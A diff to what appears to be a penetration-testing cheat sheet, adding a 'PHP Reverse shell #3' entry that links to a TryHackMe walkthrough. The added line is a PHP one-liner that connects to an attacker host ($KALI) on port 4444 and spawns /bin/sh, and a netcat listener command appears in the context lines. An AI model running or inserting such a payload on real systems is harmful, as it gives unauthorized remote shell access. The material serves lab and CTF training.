@@ -258,6 +258,18 @@ echo '</pre>';
 rlwrap nc -lvnp 9000
 ```
 
+#### PHP Reverse shell #3
+
+**Examples**
+
+[chocolate-factory.md](../walkthroughs/tryhackme/chocolate-factory.md "mention")
+
+**Web**
+
+```
+php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
 ### PHP web shell
 
 **Examples**
